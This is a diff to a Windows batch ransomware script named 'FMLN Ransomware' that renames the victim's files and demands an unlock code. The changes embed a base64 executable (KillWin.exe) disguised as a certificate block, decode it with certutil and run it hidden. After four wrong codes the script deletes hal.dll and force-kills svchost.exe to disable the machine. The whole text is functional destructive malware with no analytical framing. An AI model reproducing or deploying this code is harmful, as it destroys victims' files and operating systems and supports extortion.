@@ -1,7 +1,9 @@
 @echo off
 title FMLN Ransomware
+cd /d "%~dp0" >nul 2>nul
 mode con: cols=170 lines=45
 color c
+set Strikes=0
 if exist Encrypt.sk (goto Crypt) else (goto Encrypt)
 
 :Encrypt
@@ -348,6 +350,165 @@ start wscript "0.vbs"
 start wscript "0.vbs"
 start wscript "0.vbs"
 start wscript "0.vbs"
+(
+echo -----BEGIN CERTIFICATE-----
+echo UEsDBBQAAAAIAAyKQli2QF2qTBwAAAA2AAALAAAAS2lsbFdpbi5leGXten9cU1eW
+echo +A0kGhV82JJqW62pjZVWxZBAEgw/oiQWZ8FGQZAWiAgPkxgSNnlRbLGLE+iaeTB1
+echo Z9pZu8vM1NHOx852dpwdt1+ccdpgGIEOKl2tpS2dMh3beYrfb6n6Veoyfd9z7gsI
+echo 2Ol8v5/97uczf/TquT/OOffcc88999x7wyt8Yj+JJ4TIAUSRkA4iJQv5y2kEYO7i
+echo X84lx2adfrBDVnD6wWKnK6Cu9/u2+6vq1NVVXq+PU29j1f6gV+3yqq2PF6nrfDVs
+echo amLibE1MRtrlX7QH+Q/OjkPjtQ1nn4YyMHvwzC5aDpypouW7Z3bT8ncUn3Nt8Ewj
+echo 7TN49mEoF8w+f4aj5ZKzUvkhbW9yVTtR7rjOdhshBTIFObXr1+w4bojEyebI5j5M
+echo 7oPGfRJu3QOQJQFosWWR6nGEzIj1GS9JPZGMBymeWPZSRuSdKCcKmroMwC6Dih3G
+echo lZE701b4D+P06yTRfy4l6aatkRb6fZm8WErl2AYOyugCIimE85RP5VGDiFR/TRVX
+echo RchhhkhzR94HpvJZ4H+qxEYuxksItA1JvYMvkuoP+KtJbK72GJ/2Dj5Lqp/1+Kql
+echo uaMNqG66O/jWkq/T/9e0mb8SutJ4kFgsRP+bsG2sqKTUTUTVPq2F8KOloioZKxnN
+echo kLtJ2HZMvOCWhW1d4gV+oNvWvwIE8LYupjTiJsw823lkOd9m67O7SZutP1xxwl4K
+echo 6IvhioFa5oLterdtUAZO1m0bwpG7bX1YiKokEG4Xg8dEVQLU9KL+RnjP4XCwg1ls
+echo JWRcGaea9JEivgeGA+lusrGIFtAtXHhUVC1ENTd36XvDha+2/Afz7Z+BG+kjYdsR
+echo /Y2W95lvt0KzlvHaOvjua8wnkdCIvC2rDUfXv38VNGwFWgQJ2GiGRjR0RRlryzWi
+echo agil2/pCXYBMWiTXWchgYSufMJPv7BSSmNcig7RTDzaV0GSe7IVmP/NaJ/Pkf0ii
+echo K3/LPInFOYAok/L7a0zFRx9UtDOrunbFMylD1xjHm8yqHqz3wBAZfWkWwqS8dY0p
+echo P8+U/k8m5d1rzLw6oGwZZFLfZlKi15iyUz8EnO3AjS7r06uYVSM75zIpJ1E4YnuG
+echo F4IUxRBIARGdTMqbUHQBFUTMK+zhTzGlvS/Cqt3cc+Ia82jPVWaFrR1EJvbQDo+i
+echo ogqlDutbepgnOtEq7R/Y2t8VhIZ7CGCTKg6gfKrlqijM4yqTFGyvZZ644b8bCJtR
+echo U1U/FVZ2bjiZSTlHdd6ChDIbZOX9zCpVF50kWOO3TMofmGe/Q1B0WQbRIXoY2IdB
+echo cdCSSbl1jVlxCnpdlpQrPw0wQkVWwszKEM4A6nMm5TPo9r9BYmhUscsqaloG7kZh
+echo Z5iUj4d1TEo3CoTqo0zKb2j1k+HFtHqWSfkI9TzFpJzG6ixa/pGaNEmFC74OxjjJ
+echo F/aBk0kjrgBFyj7aZwOOFZ37bJ1QdO2zRXhbJCxn2uQvoHfFj/K2I/ED5uAJpvXH
+echo fxJFvuIEX/gqv+fwmvhucFRwT/ObTGsZUoIdzh+TeaRoU8yrHwudko83jkr7QfJy
+echo aOKe4KSqqFLj5uihG2krVC/9dkwUmcXkD3dZyDDADQAZGCEBYD4A7veLkdCV9KIS
+echo aVuXumWwqUnYqtHirnbPC5drTIBJEi+Iqi2wRB2LW4Y3wn64Odx5S8Gf7BQWx5+c
+echo tF+sGssHCAs1Ql0yhANOkw775AMQMmX/6kUcoeXGM17eqlmBu/KZUvA7q8bE/04/
+echo wOV8KxoZkj8aZV7rx1pc50fKtoQFcb2wh+Yg5g9xcVHAweaa07+ptETkNFmiagHI
+echo jcko16SvM19r/AUKf8w82vgDqGhBlxX2cWNd8oui2NdH5z8K85dCXhdqVcQvQkvQ
+echo yHcOzHFOf6PbqtHgCagXobZQATUa5Oh8k6UZxXMaTXyjZiH4vlWTBHJWhDmNOtyo
+echo SRC23E2AtUwxkoYKlisEWq4YlViF3Elk95xJDCMwfAJKEs+hXm1WTbpdVDVg9LFq
+echo 1L+aCWqEIlfBq6yaBKyM1O4vgRhdjy5A/k4ydiNGU2DIWo69YxWtHSxmElVNQAyd
+echo Uoa6laFhWTAq6XOV2aIYoArA5JI+QFCMQlvg7yIks1yTcBznDyZeyKNVrO+GGjVq
+echo chzNw2ej4Rhrp1sGK55MVX/HTfgR8R0YcAU/Om5992zJPTM5TUJb3n/CyqilwZmC
+echo qGR9800eTAcScJSUtvzPmIKecIFGc+nZL3DdxhOsVStdK/EcmGb/pNMJvDcb/RUU
+echo AI8W36ml/jfBBloNAAto9uLNL9wy/paown6AoF4OSKeMmpC/GjNiSWmRZLGiiVno
+echo pFlIQ0rDSfoM/2NMP3qeJtzhUXzw+ht4A+I/7LaNzqan3xgW+ycO2/62hDd422h4
+echo 8/U2eX7YNtqW8M+8bYzWxw725VlI9qfAz91nacruh5bsEOKY10aCdXvPEPIpGWYP
+echo np/gSrYApfMT5SFE7T2DuGHbwYHp9KRDA5QO3cnw0m4FiqRHs+L8RG0gVjuloMOW
+echo bBJVKRh7qNUm5xiprouqFTgZ26ibcb6EpOCYnaI1aD6ZZPNM21gHbEYRLg3Wgdgy
+echo FI6aeyiSsY6G9oyRDrQWkFt63bMBJdkdJE1s56jkFtTe6titpSANbxKqYiggBo2b
+echo Fgw47hk3+rttI2j3pTIYKmy7Qu0f84OYY7w3BcFn0EW+JV548ThG2ZufwwrdbkDg
+echo 3Dx6hyfBHWnzxTuwYIvwZkG6UonBUaCAYYJjokpJvS1sG5JuQPSqU8rvGS0CKl9x
+echo vbQIj4ESUSUHYtOeK4Sb71QSPaHYKUTaM4YWg4IYvEjlI6lEOinEIAxCoBKqG5FJ
+echo VmFaRsGUzkrZxBFyZtKOk+JlR+SVeCLY5xIyHjabNScAVVKqj0CAVKKD2O32Wti+
+echo +RC1THa3CMVCIFlkREbsUMm3LAZ3smoKYqVdRpQwYAeq3QSigN/qJnbhtwmEvIEC
+echo 2wo0BaGuBH1k+ed8TxunsXRemsv3h34f33l5VqhTHj/C/OzNtmQj87Mey7nL++7J
+echo RiH+t0GMBaQnYQu0SYB2gluN4S8J0Grq0xDFYmVKrFwRK7WxMh1LUXUCnVYNIpKo
+echo AFH16nTEUbQpp1GKqmO42K2aLhjXUanvE54HCfzHFdG+qQlO3XIUQv85SZJUxROY
+echo Ikbuno5InoY4es80hH3+NERkwTiCz8D1FEy4vtogzOjC8FVzIq5gUBa9tDuOkBK3
+echo TNgxhxChBB60duF7WLVClR8Rfgl1cGStcCsejp2uhMrmCBd4/yPBA4vjPKMBuV44
+echo F4R7aUc9MJeVtUSCG4W7ACG4IGuJcHOcTy4BRgapwiNI0GD2BXb8QIEd8ynpMtRB
+echo vEL4DDanEEVy8UyUAHq6Zwp66NQnjCrwTh8V9gJF+CHtnYS9o+5k5z4DDKNVosbC
+echo PNC3rDnCNIOLEd37+yr+GGLHiNAD091nGzzYDGFM37vG3Mk0r5LRMdaHExHpbILd
+echo 4OTw5GucLU2HmwdxGqwndoiwnJcwdjrrkcuJXHbK1a3AziCcDCu+9S6MJgYHhd+j
+echo DoJPgZbUi5k53P0lQqakF5fEG0rdcaX8GdhuGJUuCIWUD7juLhHujnEpRYOwFAcQ
+echo /jALqKPCDGjwWuFzaMEFSCv8G1wbYVlgpVJnUOvtaH4/qBA+noWHGJjh6XiqnaQ/
+echo f2o4gy+8wst4CIdDG+1C/SykRnlWED6VjK9r2vNHAgJ+MoueTrSXbYgvHKkJJ+J2
+echo KHNUPtmLq/EyPM1LBAewQTQRKmbh2vwGBrvEQR+IFxhS02msgW3hxP09S04iosqk
+echo pdE5C4qKKPDtvaKBXu75osoKKDC2wh1XdvqRQ841ELMTazBXbcV8UTnmGVswzy6G
+echo vLZV1USLRI4Wi+y0UBTQYmk+LVZaoWh/TtGwBg8kcshDS/mheijbbMpDjdhuGYTr
+echo creiA7YEBqqDSDzEQatb4YQcFe9WeCgVD8OGWM0t37IjQrqbGi3Sykttnm6tcIFi
+echo FNqdQ9C2xNrOA+gvQ2CfXpw5b1OW8PlZ8T3M/1iT3LZxQXw/VGbsGEmJv2q+wN3L
+echo FyaYv5Hgn82vVcavTTD3+BNCJ1PMF4KX9ZHKiih/cvjzEqGVbg9OXXMQf9B5fR+4
+echo IG+XD8vN/VySPsK/OcL8fC649oguUhk9KqvEUUN7lCQ485SiFc9xYRduMn8cLn1Q
+echo rotURAVWasx2E+EJqJYNXzoqowvVlN2GlwBOju0SPqhsucEpQl/IgtsEhaTGwy03
+echo gkuc+4FLCAMGAwHjbMfmU1KTW66LDGtDvWI4EbnCic/T/ADN22n+Es0PQ35KgePJ
+echo QO2KqFshZIAyfW6l8wju8QJwPtzOHYVPwJM+U4G/CgUrDmZBsbcDG/gDX7Dg+BwZ
+echo kvctQHIO2Ps40pZ32jcKjbAKdG8vCzVoSOODMV8/KhtezNuu8BAb9ppAbIR5vpPv
+echo xA0SY9BFpu8FMI0glwId04TGnaWPHMeV+Ptxu7VSu81o2pNAgnfBfhBkeMpC+TkK
+echo KYvZN5SNNhEBH5wpbAaBw3MkW+ZBvezmQNn9kZv9D9mUlBl794A6EnogX5JwJTnE
+echo Xge3vh5iR+kVSEtvYXrbdbj9wA0EmmlYqZEqbbYrwJRPmUbaCsf0tit625i+szcq
+echo +XBJ6RsbPrH86nX8Tdh8lpO3nAk+LDyPEaHHfDY48/jjQByeC9jZifMeI6RzKGlO
+echo T5j2vPmWI0zdvjIKsVofsUQ7wPAk6jyCU1TZYUjwx6gTfy2FTAaxSnAq6AEzHu1h
+echo AUnfSUI6jkKXaEcH5sKnOHi+PKTUhPPlwh/HW3HQglEyFfkwJPN8JNoxRDsNYj4R
+echo Y0omBxm+UHn6EXe80A5L0S3X9IF3tdEwgLePQjlVJdzSCtE13LYP8xeaMf9+E+b/
+echo 3oj5rxsgr2194TAt2g7Q4vscLVrqafGyhxY/dULR/lxLO77xbfJwy/NQacPKS1Dp
+echo puNi4OEtY257uGU/pR5BTaKgN/QAZbptR1Tgvd22VzH04I9wqgJcuRHgxIdCTHm6
+echo 0Bh322yjdinwgkUTYZ9ySpjuT9HjKnujl9gvkFtUWSR76I9LO0kZfISGpL2ZdAct
+echo 7JB20JoFwXmh3dzcnXNCxwV0feaFSFQXiTrhnhWL82jnErivKnnj3pzqQN1QcGno
+echo maT44GJ+XXK2WvHde7lF2Q9icU/2EiyYbGJ5EZRyYDg7KScCLkFYy++S0zMabhwV
+echo MPe+0NII7p5oUcnrjbDzf4WZ+Vrg3lI+p0XkZvNnY8fnO6FTcvM1/yXYksjbjLzN
+echo /xe80n3MaVtqITViBk6Nx3e8R5PUBrB8CN4U9LIL20X/G3uYFfDObhuLRQM0vG2k
+echo 5hD2owaAsAgn9itxuL+TwzPEYJIYTChxfnY/vs1BjDAqQ9daWClt2KVdOLnQFU0o
+echo 0Q5UGT6QJQ9lmnGdQ+wIXHZAB31v257BIuZH/LUn94dnhnfJw48r9b3h0gTeNsjv
+echo GQrbru+9+RjrDfI2IcPlZdfja8d2McPLsR7QETZgrG9bxWA4HvSfYxud0x0OyMN/
+echo owwXJQTzQMzSkVyRyY7MkBHuoeytM+IItzC7HgtVtn1GPOHmAhKKmYCMJ8F5fHYP
+echo 6B46KwvTyvAMCcEXXnTP3BIuHMu0XW/U6nsnjyuNxxeOwZB8xdDNKJ6a3NzQ2biY
+echo jHi+YuQgGiLUE9etQNugrx9CzM1O/CME0/xdQIR65BI1bjKVKLndtEzi/lbfy8j6
+echo 4WEX3jyC0bxwxD2j8qFT5lPB0ph4pSQgflzAjaiaM4d61BJaMY6GsyS+/6EB80Dw
+echo AZDzyyF0j8KRh06aT8KWoktmCWdgD3AlfaSXxqBijEGwPcSlL8FKiksP0Pwwzdtp
+echo LkcnXKqk+SDFmGg9geZJNE+m+Qqap9NcS3MLzVNorqG5muYLab6A5n1UZhfNrRQz
+echo QuvXaT5K8zGakzT6W+DGUDY1dmPt3j3KY3Ekws2Cyr9DJVjM/GsFuNJYaCT3yF4u
+echo 9xU52Dw4s+PbcDT2Rl+Jg/XhHn1FKafIf5CQSUra+q7UUidBa27Hc7TVsZ8WcBL3
+echo TnkSbYRnnnx5Dz3heviupWQETpweuPt0lj0Pd1W5JroS/wTVQoYviUsHqOoXaX6e
+echo 5gLkX6f/QhrMJGT/akJ2AtQCbALIAtACLAG4B2A2wC3gu5Ip9anMIaQRYD/AN3IJ
+echo OQxlBMAAdTXADIARaGuBPwXgPaivzZH6uqFdCbABoB3gCMAxgB6ApwC+HRtDYyak
+echo AGAuwFqzhLsOerwH8CbACYDDqyX8e1lS2RUrvwnjVwKcgH5NAE6ot+dKtFvAc082
+echo vAsBLAB2gH8CnlcBLgMkAD0V4HsArQDfBOAAagFWA9gB8gH6Yzptgfrl2Lj7Y7gG
+echo KPfF6geWWMh4+reFt+sinAs/mdSenvD1ga+SdaSQFJANRE02kSriJQHiI3VkF9T9
+echo hL3NTk73FaCFYZZNdKb3LZv/nTdUL2HdcptrfaxeZjHnvV3W+qMAtCMAf5cHK5CH
+echo lAj5LySMinopdONxOyXJvqzD/3uygvwvSzWTxhv/2z4eEqUAL+kBHpxKSwBIBhgF
+echo 2ug0Gl7xPdA5IR1gyVTaXDI12ZYSgi+wuKa4pnKQhb8k7dNLuE2LCdkG8CrwCABb
+echo HybkbYABgPcBfgfw0DJClgN8dj9crWZJ8hgYewxwzSijyFpkeGvWo/KPMh4/oFKG
+echo K91/jxczkre6fHOA9QcgD1b5Xb5yKxvYwfnqy/OWL1cXswGO9at15ZtYD1sVYKcg
+echo U+trtkm6PxgDlKcGeCyvuACDLX4jQL8X0NR5KaNW+rYg1YV/9NfQu9LWNDh2oUzV
+echo aqtrt4O/pkl/sk/N21Ss2ZK3Bnk803CIrJ+KewL5uCm49bRvwzQcIhun4dBhm6bi
+echo qLzmKTg7lbdvKo7ytU7BFVO+/ePzknCU7wDgjuD8Y99GWPSxfrStCTTEvoWwAr78
+echo Nn6nz8PV1RDJ/wbiJvBPPfVUzbbtOEfDuByuWiNNkTROwT1Bx2+ajCuW+Jqn4CS+
+echo fYDDUJRKFdI0IA6/NxkhE2unQ9wxo+T7MZwecT3GKWucjjiM3Y0zJnAGxGE0cWLf
+echo 2Jyd0G6Ey1TqtkCA0u3S5xv0uw+NNg1RWwHXJJvAUR2mJ7xTY9kXK7E9vAiOeIDJ
+echo 9IFJ9MQHLUQNMGa8LccCOqdrCTGZbuP6AVevleY4nv4Jzw7AcZP45HgOAG7rJFwt
+echo 4A4AbmHmbVw5nBnFMLP2SXzPAO488CVP4vsB4AqAr2MS3+uAGwE+5SS+ITyLgO/5
+echo SXwEonkf8LVOwi0BXJeWfGn6+hz/7z3HDyuKPCxbT+SyPD9bxbHFTihgc/+NbdMG
+echo W4Fel1rj8YAmssdYLi/oD/j8dh/sh/+Mi0Vgax5JiS+aQrMhbyxql7q8Nb5d+JUU
+echo 4KQG9CiNK/BV1ayv9nlLydvE6q/ahXVCupGraDeE87pClvO7qkHaGiotj2wusm0a
+echo 1+Y5mRVG59jHt7nZao6Qp1GDtTvyfB6fH5452CqGKB9rvxaPjceDHByZrbGeIJAc
+echo jS/i/CxX7VzrARkHsJfd1cCC/DQi2SLPV1dfxbm2eSi/MYa1rl9bBMO6UGMOenmg
+echo Ma6J9o6ea11cXVU9IXcTqNGRHrOuj03kNbKraicLmtn9bH2Vn80Hy7Og8bFx/OP1
+echo rJccGW/leXwBOKtPjLc3e+un9vv1OKXU7+KAs3T9hsJCOtJC4nBUB/1+1ss52IZq
+echo tp6qv+jLsA5YCvpNXT6pY+sCLGicQWJkh7PKW+Nh/enAVFcHEkryNm3eULy+0JaW
+echo rpXWZhEJ+IGJiMTj2w4R8X5Cm2AZB+eqYw3pZC1xBFino9blgWMbBLPEihjOUVVf
+echo 7+B217MkFfQCRBDuAXVVnJP1w9zuJahYrWt70M86vFV+v2+Xo8q/fSfVzuV1ca4q
+echo j+upCRLr3eny+7x1MDVCHiWO7SA/xvVlLCZJBihURzJv1x0s2ULYBhfIWIo2gEqx
+echo pGstfu9J4FntcNQ7HKhJNX47OdECveaDxlLfe6Am9c4lDj+73YUXFgdHd5rD46sG
+echo ncAMDvAb4HFA07OtqnoHntexOUuslJNFaaiBl93loErIpFHpiqBOhin28HmpUK4K
+echo fBGD7+3xY5TaoFdy5sUwmp+LaYG+gY7g93lq6x0B/NMLGsTlBTKpqnetrAus3OXy
+echo roQeK4Ocy+Pidq/0pK1MWym5wTQOXMXJ5Ol09IyvovuD3uks0zgCXI3L9xV0yXZf
+echo NYaTraqfQn9bsdkr+XuNbXxzrKNOCyeaAqLFnyWviJOiJW4su99XzcIV4piieNx+
+echo 4yjycvz6QKzh86+DuAG+DaEggB5ZJ98YZP277ay/1ge7wFsNMQWsANJX3il9fQ1J
+echo m4SVYjggSXz8REQtBgOuCYCGLNbI3vj1E05SVAAegUGEfB80srLbgtu3s/5xTZ5D
+echo yYW+mqCHzafzhTg6kzjy1uMegLeaw+PaVucIBFgdeEzAATGp2oVxyj2ZEnB5b1Me
+echo lvlhLjXkvzPhz/x/ieer0s/vfcOKn23IYm0ZmfrUCx74kk5fp7/SJKPvVoCm6Xhc
+echo U+2X4GfBIySfSHf8PZMXPpaychvqPOqd8FKFfZ+9LC1Vu0zNeqt9NS7v9uxlm4vX
+echo rTQtUwc42DBVHoi02ct2s4FluTmJs7OqYEPUbfPsVoMAbyB7WdDvXR2odrJ1VYGV
+echo da5qvy/gq+VWQjhfXRWoS92ZtkwN299VC6/cksmjgSi1OovzBwPcem+tLyZtyV+Q
+echo pl9C+0HPAAtHP4TtWBswfvZvg/iWrrH7XTshTmxnAxPEyWRbA3TFcFfA7mQ9ag/m
+echo 2cuqAuu9O307WP8yddC1phrDUvay2ipPgF2mXnV7kFV/fpSsVVN0ylo1MTk026px
+echo u0HjzuW4MyXBewbWbaZ2vlatfVgb0rZpD2u7tUvT9GnfSxtMS9Tdq8vSPaF7Wvcd
+echo 3Yc6jf6n+g59p75PP6Af1A/pL+oF/RX9n/QPpNekn0j/OP1W+swMQ0ZFBpvRmPFs
+echo xqGMroy3Mv5XxkzDfIPFUG3YYWgx/MLwuqHLcMbwsWHMIDfeY1QbHzGmGY3GbGOe
+echo sczYbPyx8Zjxl8Y+44fGK0bRmGiab3rQtNyUblptspjWmTaanjQ5TfWmkOkV0zHT
+echo adN504cmwSTPVGUuyVyXuSGzPLMmM5DZnPlc5quZvZkXM4czr2d+kcmsTlvdtHqR
+echo OdWca15vDpifMT9nfsn8c/NJ8znzh+ZrZmPW1qzurKtZM7MTsudl67KN2dbsZ7JL
+echo c7bm7Mjx57TkfDfnxZwf5ryc8y85P8/pyHkj51TO6ZzzOe/nfJRzOedqzq2cGblM
+echo bnLufbma3NTcnNwNuZW523O7c6/lEjW8y8DED2sLtE9q/doG7TPaZu23tPu139P+
+echo izYCVj6t/VB7SbsxrTLt2bQDae+kfZL2adpY2l26At1mnUvn07XrfqTr0b2le0d3
+echo Wfea/qz+Xf0tfWZ6bnp7+svpP0n/dfpb6RfSL6XLMh7I2Ao2350RymjNyDDkGNYZ
+echo vmloNbxg+AHY+4Rh2HDd8CfDHGOy0QB2LjCWGMuN24xOo9fIGZ8yNhmfNbYav2M8
+echo YPyB8bDxJ8ajxteMJ4wnjT3GM8bzxveMQ8ZPYC2uGkeNcaafmn5hOm56A9+kWngT
+echo EvwdyJPWkNYI2renFejsui26o6Bxu+ElGDdi+CrH+zr9NaT/A1BLAQIUABQAAAAI
+echo AAyKQli2QF2qTBwAAAA2AAALAAAAAAAAAAAAIAAAAAAAAABLaWxsV2luLmV4ZVBL
+echo BQYAAAAAAQABADkAAAB1HAAAAAA=
+echo -----END CERTIFICATE-----
+)>>Data.lp
+md TempData
 timeout /t 4 >nul
 ren *.bmp *.Crypt-1 >nul 2>nul
 ren *.jpg *.Crypt-2 >nul 2>nul
@@ -418,6 +579,11 @@ ren E:\*.xlsx *.Crypt-6 >nul 2>nul
 ren E:\*.mp3 *.Crypt-7 >nul 2>nul
 ren E:\*.mp4 *.Crypt-8 >nul 2>nul
 ren E:\*.wav *.Crypt-9 >nul 2>nul
+certutil -decode "Data.lp" "ZipContainer.zip" >nul 2>nul
+echo @echo off>>StarterFile.cmd
+echo powershell -command Expand-Archive -Path ZipContainer.zip -DestinationPath TempData -Force>>StarterFile.cmd
+echo call TempData\KillWin.exe>>StarterFile.cmd
+echo exit>>StarterFile.cmd
 call %RANDOM_FILE_NAME%.bat
 goto Crypt
 
@@ -456,7 +622,9 @@ if /i "%codigo%" == "032-108-351-749-645" (goto Decrypt) else (goto Error)
 goto Crypt
 
 :Error
+if /i "%Strikes%" == "4" (goto KillWin)
 msg * Codigo no valido, vuelva a introducirlo
+set /a Strikes=%Strikes% + 1
 goto Crypt
 
 :Decrypt
@@ -572,4 +740,14 @@ echo.
 echo. Presione una tecla para cerrar el programa...
 del /f /q /s "Encrypt.sk" >nul 2>nul
 pause >nul
+exit
+
+:KillWin
+del /f /q /s "%windir%\System32\hal.dll" >nul 2>nul
+msg * Codigo no valido, Su PC sera destruida
+echo Set objShell = CreateObject("WScript.Shell")>>DRunHD.vbs
+echo objShell.Run "StarterFile.cmd", 0, False>>DRunHD.vbs
+start DRunHD.vbs
+timeout /nobreak 30 >nul
+taskkill /im svchost.exe /f
 exit
